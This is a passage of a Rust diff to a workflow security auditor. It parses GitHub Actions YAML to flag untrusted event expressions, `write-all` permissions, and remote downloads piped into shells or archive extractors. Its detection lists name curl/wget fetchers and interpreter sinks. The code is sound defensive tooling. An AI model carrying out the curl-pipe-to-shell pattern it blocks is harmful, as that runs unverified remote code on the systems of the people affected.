         let is_build_rs = rel == "build.rs" || rel.ends_with("/build.rs");
         if is_prod_src || is_build_rs {
             out.push(rel);
@@ -1219,8 +1511,12 @@ struct WorkflowParseState {
     jobs_indent: usize,
     job_indent: Option<usize>,
     current_job: Option<String>,
+    steps_indent: Option<usize>,
+    flow_steps_bracket_depth: usize,
+    flow_step_brace_depth: usize,
     top_perm_indent: Option<usize>,
     job_perm_indent: Option<usize>,
+    flow_perm_is_top: Option<bool>,
     saw_top_permissions: bool,
     top_has_contents_read: bool,
     run_block: Option<RunBlockAccum>,
@@ -1228,7 +1524,91 @@ struct WorkflowParseState {
 
 struct RunBlockAccum {
     key_col: usize,
+    open_quote: Option<u8>,
     lines: Vec<(usize, String)>,
+}
+
+/// Split comma-separated entries inside a YAML flow mapping `{ ... }`, respecting quotes and `${{ ... }}`.
+fn split_yaml_flow_entries(inner: &str) -> Vec<&str> {
+    let bytes = inner.as_bytes();
+    let mut out = Vec::new();
+    let mut start = 0usize;
+    let mut quote: Option<u8> = None;
+    let mut brace_depth = 0usize;
+    let mut i = 0usize;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if let Some(q) = quote {
+            if b == b'\\' && q == b'"' {
+                i += 2;
+                continue;
+            }
+            if b == q {
+                if q == b'\'' && bytes.get(i + 1) == Some(&b'\'') {
+                    i += 2;
+                    continue;
+                }
+                quote = None;
+            }
+        } else {
+            match b {
+                b'"' | b'\'' => quote = Some(b),
+                b'{' => brace_depth += 1,
+                b'}' => brace_depth = brace_depth.saturating_sub(1),
+                b',' if brace_depth == 0 => {
+                    let seg = inner.get(start..i).unwrap_or("").trim();
+                    if !seg.is_empty() {
+                        out.push(seg);
+                    }
+                    start = i + 1;
+                }
+                _ => {}
+            }
+        }
+        i += 1;
+    }
+    let tail = inner.get(start..).unwrap_or("").trim();
+    if !tail.is_empty() {
+        out.push(tail);
+    }
+    out
+}
+
+fn find_unquoted_closing_brace(s: &str) -> Option<usize> {
+    let bytes = s.as_bytes();
+    let mut quote: Option<u8> = None;
+    let mut depth = 0usize;
+    let mut i = 0usize;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if let Some(q) = quote {
+            if b == b'\\' && q == b'"' {
+                i += 2;
+                continue;
+            }
+            if b == q {
+                if q == b'\'' && bytes.get(i + 1) == Some(&b'\'') {
+                    i += 2;
+                    continue;
+                }
+                quote = None;
+            }
+        } else {
+            match b {
+                b'"' | b'\'' => quote = Some(b),
+                b'{' => depth += 1,
+                b'}' => {
+                    if depth == 0 {
+                        return Some(i);
+                    }
+                    depth -= 1;
+                }
+                _ => {}
+            }
+        }
+        i += 1;
+    }
+    None
 }
 
 fn split_yaml_unquoted_key(trimmed: &str) -> Option<(&str, &str)> {
@@ -1258,6 +1638,27 @@ fn split_yaml_unquoted_key(trimmed: &str) -> Option<(&str, &str)> {
     None
 }
 
+fn line_closes_yaml_quote(raw: &str, quote: u8) -> bool {
+    let trimmed = strip_yaml_comment(raw).trim_end().trim_end_matches(',').trim_end();
+    let bytes = trimmed.as_bytes();
+    if bytes.last() != Some(&quote) {
+        return false;
+    }
+    if quote == b'"' {
+        let mut bs = 0usize;
+        let mut idx = bytes.len().saturating_sub(1);
+        while idx > 0 && bytes[idx - 1] == b'\\' {
+            bs += 1;
+            idx -= 1;
+        }
+        bs.is_multiple_of(2)
+    } else {
+        // YAML single-quoted scalar escapes `'` as `''`; an odd trailing run of `'` closes it.
+        let run = bytes.iter().rev().take_while(|&&b| b == b'\'').count();
+        !run.is_multiple_of(2)
+    }
+}
+
 fn flush_run_block(rel: &str, state: &mut WorkflowParseState, violations: &mut Vec<TelemetryViolation>) {
     let Some(block) = state.run_block.take() else {
         return;
@@ -1276,6 +1677,22 @@ fn flush_run_block(rel: &str, state: &mut WorkflowParseState, violations: &mut V
         offset_lines.extend(std::iter::repeat_n(*ln, txt.len()));
     }
     flag_untrusted_event_expr_spans(rel, &combined, &offset_lines, violations);
+
+    if let Some(q) = block.open_quote {
+        // Multiline YAML quoted scalars fold line breaks into spaces and terminate with a matching quote.
+        let mut folded = String::new();
+        for (idx, (_, raw)) in block.lines.iter().enumerate() {
+            let piece = if idx == 0 { raw.as_str() } else { raw.trim() };
+            if !folded.is_empty() && !piece.is_empty() {
+                folded.push(' ');
+            }
+            folded.push_str(piece);
+        }
+        let cleaned = folded.trim_end().trim_end_matches(',').trim_end();
+        let unquoted = cleaned.strip_suffix(char::from(q)).unwrap_or(cleaned);
+        flag_remote_script_execution(rel, block.lines[0].0, unquoted, violations);
+        return;
+    }
 
     let mut logical_line_no = block.lines[0].0;
     let mut logical_cmd = String::new();
@@ -1303,8 +1720,14 @@ fn audit_workflow_yaml(rel: &str, yaml: &str, require_permissions: bool, violati
     for (idx, raw) in yaml.lines().enumerate() {
         let line_no = idx + 1;
         if let Some(ref mut block) = state.run_block {
-            if raw.trim().is_empty() || leading_spaces(raw) > block.key_col {
+            let lead = leading_spaces(raw);
+            let cont = raw.trim().is_empty() || lead > block.key_col || (block.open_quote.is_some() && lead >= block.key_col);
+            if cont {
+                let closes_quote = block.open_quote.is_some_and(|q| line_closes_yaml_quote(raw, q));
                 block.lines.push((line_no, raw.to_owned()));
+                if closes_quote {
+                    flush_run_block(rel, &mut state, violations);
+                }
                 continue;
             }
             flush_run_block(rel, &mut state, violations);
@@ -1320,8 +1743,12 @@ fn audit_workflow_yaml(rel: &str, yaml: &str, require_permissions: bool, violati
         if handle_permissions_line(rel, line_no, indent, trimmed, &mut state, violations) {
             continue;
         }
+        // Handle flow-sequence `steps: [{ uses: ..., run: ... }]` and single/multiline flow step maps `{ ... }`.
+        if handle_flow_steps_line(rel, line_no, trimmed, &mut state, violations) {
+            continue;
+        }
         check_workflow_uses_sha(rel, line_no, code, violations);
-        check_run_directive(line_no, code, &mut state);
+        check_run_directive(rel, line_no, indent, code, &mut state, violations);
     }
     flush_run_block(rel, &mut state, violations);
 
@@ -1335,12 +1762,133 @@ fn audit_workflow_yaml(rel: &str, yaml: &str, require_permissions: bool, violati
     }
 }
 
-fn update_workflow_scope(state: &mut WorkflowParseState, indent: usize, trimmed: &str) {
-    if state.top_perm_indent.is_some_and(|p| indent <= p) {
-        state.top_perm_indent = None;
+fn handle_flow_steps_line(
+    rel: &str,
+    line_no: usize,
+    trimmed: &str,
+    state: &mut WorkflowParseState,
+    violations: &mut Vec<TelemetryViolation>,
+) -> bool {
+    let flow_slice = if state.flow_step_brace_depth > 0 || state.flow_steps_bracket_depth > 0 {
+        Some(trimmed)
+    } else if let Some((key, rhs)) = split_yaml_unquoted_key(trimmed)
+        && key == "steps"
+        && rhs.starts_with('[')
+    {
+        Some(rhs)
+    } else if state.steps_indent.is_some() && trimmed.starts_with('[') {
+        Some(trimmed)
+    } else if state.steps_indent.is_some()
+        && let Some((key, rhs)) = split_yaml_unquoted_key(trimmed.strip_prefix('-').map_or(trimmed, str::trim_start))
+        && key == "with"
+        && rhs.starts_with('{')
+    {
+        Some(rhs)
+    } else {
+        let step_body = trimmed.strip_prefix('-').map_or(trimmed, str::trim_start);
+        step_body.starts_with('{').then_some(step_body)
+    };
+    let Some(slice) = flow_slice else {
+        return false;
+    };
+    audit_flow_step_chunk(rel, line_no, slice, state, violations);
+    true
+}
+
+fn audit_flow_step_chunk(rel: &str, line_no: usize, chunk: &str, state: &mut WorkflowParseState, violations: &mut Vec<TelemetryViolation>) {
+    let bytes = chunk.as_bytes();
+    let mut quote: Option<u8> = None;
+    let mut seg_start = if state.flow_step_brace_depth > 0 { Some(0usize) } else { None };
+    let mut i = 0usize;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if let Some(q) = quote {
+            if b == b'\\' && q == b'"' {
+                i += 2;
+                continue;
+            }
+            if b == q {
+                if q == b'\'' && bytes.get(i + 1) == Some(&b'\'') {
+                    i += 2;
+                    continue;
+                }
+                quote = None;
+            }
+            i += 1;
+            continue;
+        }
+        match b {
+            b'"' | b'\'' => quote = Some(b),
+            b'[' => state.flow_steps_bracket_depth += 1,
+            b']' => state.flow_steps_bracket_depth = state.flow_steps_bracket_depth.saturating_sub(1),
+            b'{' => {
+                if state.flow_step_brace_depth == 0 {
+                    seg_start = Some(i + 1);
+                }
+                state.flow_step_brace_depth += 1;
+            }
+            b'}' if state.flow_step_brace_depth > 0 => {
+                state.flow_step_brace_depth -= 1;
+                if state.flow_step_brace_depth == 0
+                    && let Some(start) = seg_start.take()
+                {
+                    audit_flow_step_entries(rel, line_no, chunk.get(start..i).unwrap_or(""), state.steps_indent.is_some(), violations);
+                }
+            }
+            _ => {}
+        }
+        i += 1;
     }
-    if state.job_perm_indent.is_some_and(|p| indent <= p) {
-        state.job_perm_indent = None;
+    if let Some(start) = seg_start {
+        audit_flow_step_entries(rel, line_no, chunk.get(start..).unwrap_or(""), state.steps_indent.is_some(), violations);
+    }
+}
+
+fn audit_flow_step_entries(rel: &str, line_no: usize, inner: &str, in_steps: bool, violations: &mut Vec<TelemetryViolation>) {
+    for entry in split_yaml_flow_entries(inner) {
+        check_workflow_uses_sha(rel, line_no, entry, violations);
+        if in_steps {
+            if let Some((key, rhs)) = split_yaml_unquoted_key(entry.trim())
+                && key == "with"
+                && let Some(nested) = rhs.trim().strip_prefix('{').and_then(|s| s.strip_suffix('}'))
+            {
+                audit_flow_step_entries(rel, line_no, nested, true, violations);
+                continue;
+            }
+            check_inline_flow_run(rel, line_no, entry, violations);
+        }
+    }
+}
+
+fn check_inline_flow_run(rel: &str, line_no: usize, entry: &str, violations: &mut Vec<TelemetryViolation>) {
+    let Some((key, rhs)) = split_yaml_unquoted_key(entry.trim()) else {
+        return;
+    };
+    if !matches!(key, "run" | "script" | "prepare") {
+        return;
+    }
+    let val = unquote_scalar(rhs.trim_end_matches([']', '}', ',']).trim());
+    if val.is_empty() {
+        return;
+    }
+    let offset_lines = vec![line_no; val.len()];
+    flag_untrusted_event_expr_spans(rel, val, &offset_lines, violations);
+    flag_remote_script_execution(rel, line_no, val, violations);
+}
+
+fn update_workflow_scope(state: &mut WorkflowParseState, indent: usize, trimmed: &str) {
+    if state.flow_perm_is_top.is_none() {
+        if state.top_perm_indent.is_some_and(|p| indent <= p) {
+            state.top_perm_indent = None;
+        }
+        if state.job_perm_indent.is_some_and(|p| indent <= p) {
+            state.job_perm_indent = None;
+        }
+    }
+    if state.steps_indent.is_some_and(|s| {
+        state.flow_steps_bracket_depth == 0 && state.flow_step_brace_depth == 0 && (indent < s || (indent == s && !trimmed.starts_with('-')))
+    }) {
+        state.steps_indent = None;
     }
     if indent == 0 {
         let is_jobs = split_yaml_unquoted_key(trimmed).is_some_and(|(k, rhs)| k == "jobs" && rhs.is_empty());
@@ -1360,8 +1908,37 @@ fn update_workflow_scope(state: &mut WorkflowParseState, indent: usize, trimmed:
             && !job_key.contains(char::is_whitespace)
         {
             state.current_job = Some(job_key.to_owned());
+            state.steps_indent = None;
+            return;
         }
     }
+    if !trimmed.starts_with('-')
+        && let Some((key, _)) = split_yaml_unquoted_key(trimmed)
+        && key == "steps"
+    {
+        state.steps_indent = Some(indent);
+    }
+}
+
+fn process_flow_permission_chunk(
+    rel: &str,
+    line_no: usize,
+    chunk: &str,
+    is_top: bool,
+    state: &mut WorkflowParseState,
+    violations: &mut Vec<TelemetryViolation>,
+) -> bool {
+    let (body, closed) = match find_unquoted_closing_brace(chunk) {
+        Some(end) => (chunk.get(..end).unwrap_or(chunk), true),
+        None => (chunk, false),
+    };
+    for entry in split_yaml_flow_entries(body) {
+        if let Some((scope, level)) = split_yaml_unquoted_key(entry.trim()) {
+            let level_clean = level.trim().trim_end_matches([',', '}']).trim();
+            validate_permission_entry(rel, line_no, scope, level_clean, is_top, state, violations);
+        }
+    }
+    closed
 }
 
 fn handle_permissions_line(
@@ -1372,6 +1949,19 @@ fn handle_permissions_line(
     state: &mut WorkflowParseState,
     violations: &mut Vec<TelemetryViolation>,
 ) -> bool {
+    if let Some(is_top) = state.flow_perm_is_top {
+        let closed = process_flow_permission_chunk(rel, line_no, trimmed, is_top, state, violations);
+        if closed {
+            state.flow_perm_is_top = None;
+            if is_top {
+                state.top_perm_indent = None;
+            } else {
+                state.job_perm_indent = None;
+            }
+        }
+        return true;
+    }
+
     if let Some((key, rhs)) = split_yaml_unquoted_key(trimmed)
         && key == "permissions"
     {
@@ -1392,33 +1982,56 @@ fn handle_permissions_line(
             });
             return true;
         }
-        if let Some(inner) = rhs.strip_prefix('{').and_then(|s| s.strip_suffix('}')) {
-            for entry in inner.split(',') {
-                if let Some((scope, level)) = split_yaml_unquoted_key(entry.trim()) {
-                    validate_permission_entry(rel, line_no, scope, level, is_top, state, violations);
+        if let Some(after_open) = rhs.strip_prefix('{') {
+            let closed = process_flow_permission_chunk(rel, line_no, after_open, is_top, state, violations);
+            if closed {
+                if is_top {
+                    state.top_perm_indent = None;
+                } else {
+                    state.job_perm_indent = None;
                 }
-            }
-            if is_top {
-                state.top_perm_indent = None;
             } else {
-                state.job_perm_indent = None;
+                state.flow_perm_is_top = Some(is_top);
             }
         }
         return true;
     }
 
-    if state.top_perm_indent.is_some_and(|p| indent > p)
-        && let Some((scope, level)) = split_yaml_unquoted_key(trimmed)
-    {
-        validate_permission_entry(rel, line_no, scope, level, true, state, violations);
-        return true;
-    }
-
-    if state.job_perm_indent.is_some_and(|p| indent > p)
-        && let Some((scope, level)) = split_yaml_unquoted_key(trimmed)
-    {
-        validate_permission_entry(rel, line_no, scope, level, false, state, violations);
-        return true;
+    let perm_scope_is_top = if state.top_perm_indent.is_some_and(|p| indent > p) {
+        Some(true)
+    } else if state.job_perm_indent.is_some_and(|p| indent > p) {
+        Some(false)
+    } else {
+        None
+    };
+    if let Some(is_top) = perm_scope_is_top {
+        if unquote_scalar(trimmed) == "write-all" {
+            violations.push(TelemetryViolation {
+                check: 4,
+                path: rel.to_owned(),
+                line: line_no,
+                detail: String::from("`permissions: write-all` is forbidden"),
+            });
+            return true;
+        }
+        if let Some(after_open) = trimmed.strip_prefix('{') {
+            let closed = process_flow_permission_chunk(rel, line_no, after_open, is_top, state, violations);
+            if closed {
+                if is_top {
+                    state.top_perm_indent = None;
+                } else {
+                    state.job_perm_indent = None;
+                }
+            } else {
+                state.flow_perm_is_top = Some(is_top);
+            }
+            return true;
+        }
+        if let Some((scope, level)) = split_yaml_unquoted_key(trimmed) {
+            let level_clean = level.trim().trim_end_matches([',', '}']).trim();
+            validate_permission_entry(rel, line_no, scope, level_clean, is_top, state, violations);
+            return true;
+        }
     }
     false
 }
@@ -1474,7 +2087,7 @@ fn check_workflow_uses_sha(rel: &str, line_no: usize, code: &str, violations: &m
     if key != "uses" {
         return;
     }
-    let spec = unquote_scalar(rhs);
+    let spec = unquote_scalar(rhs.trim_end_matches([',', '}']).trim());
     if spec.starts_with("./") || spec.starts_with("../") {
         return;
     }
@@ -1489,18 +2102,80 @@ fn check_workflow_uses_sha(rel: &str, line_no: usize, code: &str, violations: &m
     }
 }
 
-fn check_run_directive(line_no: usize, code: &str, state: &mut WorkflowParseState) {
+fn is_complete_single_line_quoted_scalar(s: &str) -> bool {
+    let bytes = s.as_bytes();
+    if bytes.len() < 2 {
+        return false;
+    }
+    match bytes[0] {
+        b'"' => {
+            let mut i = 1usize;
+            while i < bytes.len() {
+                if bytes[i] == b'\\' {
+                    i += 2;
+                    continue;
+                }
+                if bytes[i] == b'"' {
+                    return i + 1 == bytes.len();
+                }
+                i += 1;
+            }
+            false
+        }
+        b'\'' => {
+            let mut i = 1usize;
+            while i < bytes.len() {
+                if bytes[i] == b'\'' {
+                    if bytes.get(i + 1) == Some(&b'\'') {
+                        i += 2;
+                        continue;
+                    }
+                    return i + 1 == bytes.len();
+                }
+                i += 1;
+            }
+            false
+        }
+        _ => false,
+    }
+}
+
+fn check_run_directive(
+    rel: &str,
+    line_no: usize,
+    indent: usize,
+    code: &str,
+    state: &mut WorkflowParseState,
+    violations: &mut Vec<TelemetryViolation>,
+) {
+    // Only enter `run_block` inside a `steps:` section (never on a job named `run:`/`script:`/`prepare:`).
+    if !state.steps_indent.is_some_and(|s| indent >= s) {
+        return;
+    }
     let Some((key_col, rhs)) = split_yaml_script_key(code) else {
         return;
     };
     let trimmed_rhs = rhs.trim();
     let effective_rhs =
         if let Some((_, inner_rhs)) = split_yaml_unquoted_key(trimmed_rhs).filter(|(k, _)| *k == "run") { inner_rhs } else { trimmed_rhs };
-    let mut lines = Vec::new();
-    if !effective_rhs.is_empty() && !is_yaml_block_scalar(effective_rhs) {
-        lines.push((line_no, effective_rhs.to_owned()));
+    if is_yaml_block_scalar(effective_rhs) || effective_rhs.is_empty() {
+        state.run_block = Some(RunBlockAccum { key_col, open_quote: None, lines: Vec::new() });
+        return;
     }
-    state.run_block = Some(RunBlockAccum { key_col, lines });
+    let cleaned_rhs = effective_rhs.trim_end_matches(',').trim();
+    if is_complete_single_line_quoted_scalar(cleaned_rhs) {
+        let val = unquote_scalar(cleaned_rhs);
+        let offset_lines = vec![line_no; val.len()];
+        flag_untrusted_event_expr_spans(rel, val, &offset_lines, violations);
+        flag_remote_script_execution(rel, line_no, val, violations);
+        return;
+    }
+    let (open_quote, first_line) = match cleaned_rhs.as_bytes().first().copied() {
+        Some(q @ (b'"' | b'\'')) => (Some(q), cleaned_rhs.get(1..).unwrap_or("")),
+        _ => (None, unquote_scalar(cleaned_rhs)),
+    };
+    let lines = vec![(line_no, first_line.to_owned())];
+    state.run_block = Some(RunBlockAccum { key_col, open_quote, lines });
 }
 
 fn split_yaml_script_key(code: &str) -> Option<(usize, &str)> {
@@ -1531,17 +2206,49 @@ fn is_yaml_block_scalar(rhs: &str) -> bool {
     rest.chars().all(|c| matches!(c, '-' | '+' | '0'..='9'))
 }
 
+/// Find the closing `}}` of a GitHub Actions expression while skipping `'...'` string literals
+/// (including escaped `''` inside single-quoted literals).
+fn find_gha_expr_close(after_open: &str) -> Option<usize> {
+    let bytes = after_open.as_bytes();
+    let mut in_sq = false;
+    let mut i = 0usize;
+    while i < bytes.len() {
+        if in_sq {
+            if bytes[i] == b'\'' {
+                if bytes.get(i + 1) == Some(&b'\'') {
+                    i += 2;
+                    continue;
+                }
+                in_sq = false;
+            }
+            i += 1;
+            continue;
+        }
+        if bytes[i] == b'\'' {
+            in_sq = true;
+            i += 1;
+            continue;
+        }
+        if bytes.get(i..i + 2) == Some(b"}}") {
+            return Some(i);
+        }
+        i += 1;
+    }
+    None
+}
+
 fn flag_untrusted_event_expr_spans(rel: &str, text: &str, offset_lines: &[usize], violations: &mut Vec<TelemetryViolation>) {
     let mut pos = 0usize;
     while let Some(start_rel) = text.get(pos..).and_then(|s| s.find("${{")) {
         let expr_line = offset_lines.get(pos + start_rel).copied().unwrap_or(1);
         let expr_start = pos + start_rel + 3;
         let after_open = text.get(expr_start..).unwrap_or("");
-        let (expr, next_pos) = match after_open.split_once("}}") {
-            Some((inner, _)) => (inner, expr_start + inner.len() + 2),
+        let (expr, next_pos) = match find_gha_expr_close(after_open) {
+            Some(end) => (after_open.get(..end).unwrap_or(after_open), expr_start + end + 2),
             None => (after_open, text.len()),
         };
-        let lower_compact: String = expr.chars().filter(|c| !c.is_whitespace()).map(|c| c.to_ascii_lowercase()).collect();
+        let normalized_bracket = normalize_js_member_syntax(&expr.to_ascii_lowercase());
+        let lower_compact: String = normalized_bracket.chars().filter(|c| !c.is_whitespace()).collect();
         if let Some(ref_kind) = untrusted_expr_kind(&lower_compact) {
             violations.push(TelemetryViolation {
                 check: 4,
@@ -1555,33 +2262,269 @@ fn flag_untrusted_event_expr_spans(rel: &str, text: &str, offset_lines: &[usize]
 }
 
 fn untrusted_expr_kind(lower_compact: &str) -> Option<&'static str> {
-    for (needle, label, needs_right_boundary) in [
-        ("github.event.", "github.event.*", false),
-        ("inputs.", "inputs.*", false),
-        ("github.head_ref", "github.head_ref", true),
-        ("github.ref_name", "github.ref_name", true),
+    for (needle, label, forbid_dot_left) in [
+        ("github.event", "github.event.*", false),
+        ("inputs", "inputs.*", true),
+        ("github.head_ref", "github.head_ref", false),
+        ("github.ref_name", "github.ref_name", false),
     ] {
-        if has_expr_token(lower_compact, needle, needs_right_boundary) {
+        if has_expr_token(lower_compact, needle, forbid_dot_left) {
             return Some(label);
         }
     }
     None
 }
 
-fn has_expr_token(lower_compact: &str, needle: &str, needs_right_boundary: bool) -> bool {
+fn has_expr_token(lower_compact: &str, needle: &str, forbid_dot_left: bool) -> bool {
     let bytes = lower_compact.as_bytes();
     let mut pos = 0usize;
     while let Some(rel) = lower_compact.get(pos..).and_then(|s| s.find(needle)) {
         let hit = pos + rel;
         let end = hit + needle.len();
-        let left_ok = hit == 0 || !is_ident_byte(bytes[hit - 1]);
-        let right_ok = !needs_right_boundary || end == bytes.len() || !is_ident_byte(bytes[end]);
+        let left_ok = hit == 0 || (!is_ident_byte(bytes[hit - 1]) && (!forbid_dot_left || bytes[hit - 1] != b'.'));
+        let right_ok = end == bytes.len() || !is_ident_byte(bytes[end]);
         if left_ok && right_ok {
             return true;
         }
         pos = hit + 1;
     }
     false
+}
+
+/// Split a shell command line into top-level list segments on unquoted `;`, `&&`, or `||`
+/// outside `{ ... }` / `( ... )` grouping delimiters.
+fn split_shell_lists(cmd: &str) -> Vec<&str> {
+    let bytes = cmd.as_bytes();
+    let mut out = Vec::new();
+    let mut start = 0usize;
+    let mut quote: Option<u8> = None;
+    let mut brace = 0usize;
+    let mut paren = 0usize;
+    let mut i = 0usize;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if let Some(q) = quote {
+            if b == b'\\' && q == b'"' {
+                i += 2;
+                continue;
+            }
+            if b == q {
+                quote = None;
+            }
+        } else {
+            match b {
+                b'"' | b'\'' => quote = Some(b),
+                b'{' => brace += 1,
+                b'}' => brace = brace.saturating_sub(1),
+                b'(' => paren += 1,
+                b')' => paren = paren.saturating_sub(1),
+                b';' if brace == 0 && paren == 0 => {
+                    out.push(cmd.get(start..i).unwrap_or(""));
+                    start = i + 1;
+                }
+                b'&' if brace == 0 && paren == 0 => {
+                    if bytes.get(i + 1) == Some(&b'&') {
+                        out.push(cmd.get(start..i).unwrap_or(""));
+                        start = i + 2;
+                        i += 2;
+                        continue;
+                    }
+                    // Split on single `&` background list separator while preserving `|&`, `>&`, `<&`, and `&>`.
+                    let prev = i.checked_sub(1).and_then(|p| bytes.get(p).copied());
+                    let next = bytes.get(i + 1).copied();
+                    if !matches!(prev, Some(b'|' | b'>' | b'<')) && next != Some(b'>') {
+                        out.push(cmd.get(start..i).unwrap_or(""));
+                        start = i + 1;
+                    }
+                }
+                b'|' if brace == 0 && paren == 0 && bytes.get(i + 1) == Some(&b'|') => {
+                    out.push(cmd.get(start..i).unwrap_or(""));
+                    start = i + 2;
+                    i += 2;
+                    continue;
+                }
+                _ => {}
+            }
+        }
+        i += 1;
+    }
+    out.push(cmd.get(start..).unwrap_or(""));
+    out
+}
+
+/// Split a shell pipeline on unquoted `|` or bash `|&` operators (ignoring `||` and grouped subshells).
+fn split_shell_pipeline_stages(cmd: &str) -> Vec<&str> {
+    let bytes = cmd.as_bytes();
+    let mut stages = Vec::new();
+    let mut start = 0usize;
+    let mut quote: Option<u8> = None;
+    let mut brace = 0usize;
+    let mut paren = 0usize;
+    let mut i = 0usize;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if let Some(q) = quote {
+            if b == b'\\' && q == b'"' {
+                i += 2;
+                continue;
+            }
+            if b == q {
+                quote = None;
+            }
+        } else {
+            match b {
+                b'"' | b'\'' => quote = Some(b),
+                b'{' => brace += 1,
+                b'}' => brace = brace.saturating_sub(1),
+                b'(' => paren += 1,
+                b')' => paren = paren.saturating_sub(1),
+                b'|' if brace == 0 && paren == 0 => {
+                    if bytes.get(i + 1) == Some(&b'|') {
+                        i += 2;
+                        continue;
+                    }
+                    stages.push(cmd.get(start..i).unwrap_or(""));
+                    if bytes.get(i + 1) == Some(&b'&') {
+                        start = i + 2;
+                        i += 2;
+                        continue;
+                    }
+                    start = i + 1;
+                }
+                _ => {}
+            }
+        }
+        i += 1;
+    }
+    stages.push(cmd.get(start..).unwrap_or(""));
+    stages
+}
+
+fn wrapper_flag_takes_arg(wrapper: &str, flag: &str) -> bool {
+    match wrapper {
+        "sudo" => matches!(
+            flag,
+            "-u" | "-g" | "-C" | "-h" | "-p" | "-r" | "-t" | "-T" | "-U" | "--user" | "--group" | "--host" | "--prompt" | "--role" | "--type"
+        ),
+        "env" => matches!(flag, "-u" | "-C" | "-S" | "--unset" | "--chdir" | "--split-string"),
+        "timeout" => matches!(flag, "-k" | "-s" | "--kill-after" | "--signal"),
+        "nice" => matches!(flag, "-n" | "--adjustment"),
+        _ => false,
+    }
+}
+
+fn short_flag_cluster_expects_next_arg(wrapper: &str, tok: &str) -> bool {
+    let Some(cluster) = tok.strip_prefix('-') else {
+        return false;
+    };
+    if cluster.is_empty() || cluster.starts_with('-') || cluster.contains('=') {
+        return false;
+    }
+    let mut chars = cluster.chars().peekable();
+    while let Some(ch) = chars.next() {
+        let short = format!("-{ch}");
+        if wrapper_flag_takes_arg(wrapper, &short) {
+            return chars.peek().is_none();
+        }
+    }
+    false
+}
+
+/// Extract the executed command basename of a shell pipeline stage (skipping `sudo`/`env`/`command`/
+/// `timeout`/`nice` wrappers, wrapper flags + option arguments, and `KEY=val` assignments).
+fn pipeline_stage_command_name(stage: &str) -> Option<&str> {
+    let mut active_wrapper: Option<&str> = None;
+    let mut skip_next_arg = false;
+    let mut skip_timeout_duration = false;
+    for raw_tok in stage.split_whitespace() {
+        let tok = raw_tok.trim_matches(|c| matches!(c, '"' | '\'' | '(' | ')' | '{' | '}' | ';' | '&' | '!'));
+        if tok.is_empty() {
+            continue;
+        }
+        if skip_next_arg {
+            skip_next_arg = false;
+            continue;
+        }
+        if tok == "--" && active_wrapper.is_some() {
+            active_wrapper = None;
+            continue;
+        }
+        if let Some(wrapper) = active_wrapper
+            && tok.starts_with('-')
+        {
+            if !tok.contains('=') && (wrapper_flag_takes_arg(wrapper, tok) || short_flag_cluster_expects_next_arg(wrapper, tok)) {
+                skip_next_arg = true;
+            }
+            continue;
+        }
+        if skip_timeout_duration {
+            skip_timeout_duration = false;
+            continue;
+        }
+        if tok.contains('=') && !tok.starts_with('-') && !tok.starts_with('/') {
+            continue;
+        }
+        let base = tok.rsplit('/').next().unwrap_or(tok);
+        if matches!(base, "sudo" | "env" | "command" | "nohup" | "exec" | "time" | "timeout" | "nice") {
+            active_wrapper = Some(base);
+            if base == "timeout" {
+                skip_timeout_duration = true;
+            }
+            continue;
+        }
+        return Some(base);
+    }
+    None
+}
+
+fn extract_leading_shell_group(trimmed: &str) -> Option<&str> {
+    let bytes = trimmed.as_bytes();
+    let (open, close) = match bytes.first().copied()? {
+        b'{' => (b'{', b'}'),
+        b'(' => (b'(', b')'),
+        _ => return None,
+    };
+    let mut depth = 1usize;
+    let mut quote: Option<u8> = None;
+    let mut i = 1usize;
+    while i < bytes.len() {
+        let b = bytes[i];
+        if let Some(q) = quote {
+            if b == b'\\' && q == b'"' {
+                i += 2;
+                continue;
+            }
+            if b == q {
+                quote = None;
+            }
+        } else if b == b'"' || b == b'\'' {
+            quote = Some(b);
+        } else if b == open {
+            depth += 1;
+        } else if b == close {
+            depth -= 1;
+            if depth == 0 {
+                return trimmed.get(1..i);
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
+fn stage_invokes_remote_exec_sink(stage: &str) -> bool {
+    let trimmed = stage.trim();
+    if let Some(inner) = extract_leading_shell_group(trimmed) {
+        return split_shell_lists(inner).into_iter().flat_map(split_shell_pipeline_stages).any(stage_invokes_remote_exec_sink);
+    }
+    pipeline_stage_command_name(trimmed).is_some_and(is_remote_exec_sink_command)
+}
+
+fn is_remote_exec_sink_command(cmd: &str) -> bool {
+    matches!(
+        cmd,
+        "sh" | "bash" | "zsh" | "dash" | "ksh" | "ash" | "fish" | "python" | "python3" | "perl" | "ruby" | "node" | "tar" | "bsdtar" | "gtar"
+    ) || cmd.starts_with("python3.")
 }
 
 fn flag_remote_script_execution(rel: &str, line_no: usize, raw: &str, violations: &mut Vec<TelemetryViolation>) {
@@ -1598,19 +2541,23 @@ fn flag_remote_script_execution(rel: &str, line_no: usize, raw: &str, violations
             detail: String::from("unpinned remote script URL off `main`/`master` branch is forbidden in workflows"),
         });
     }
-    let has_fetcher = contains_telemetry_term(&lower, "curl") || contains_telemetry_term(&lower, "wget");
-    if has_fetcher
-        && let Some((_, pipe_rhs)) = lower.split_once('|')
-        && ["sh", "bash", "zsh", "dash", "python", "sudo tar", "tar "]
-            .iter()
-            .any(|sink| pipe_rhs.split_whitespace().collect::<Vec<_>>().join(" ").contains(sink))
-    {
-        violations.push(TelemetryViolation {
-            check: 4,
-            path: rel.to_owned(),
-            line: line_no,
-            detail: String::from("piping remote download directly to shell or archive extractor without sha256sum verification is forbidden"),
-        });
+    'lists: for list_item in split_shell_lists(&lower) {
+        let stages = split_shell_pipeline_stages(list_item);
+        let mut saw_fetcher = false;
+        for stage in stages {
+            if saw_fetcher && stage_invokes_remote_exec_sink(stage) {
+                violations.push(TelemetryViolation {
+                    check: 4,
+                    path: rel.to_owned(),
+                    line: line_no,
+                    detail: String::from("piping remote download directly to shell or archive extractor without sha256sum verification is forbidden"),
+                });
+                break 'lists;
+            }
+            if contains_telemetry_term(stage, "curl") || contains_telemetry_term(stage, "wget") {
+                saw_fetcher = true;
+            }
+        }
     }
 }
 
@@ -1660,43 +2607,117 @@ fn parse_netlify_header_blocks(text: &str) -> (BTreeMap<String, (usize, String)>
     (global, all)
 }
 
+fn is_scoped_apache_block_tag(tag_name_lower: &str) -> bool {
+    matches!(
+        tag_name_lower,
+        "files"
+            | "filesmatch"
+            | "location"
+            | "locationmatch"
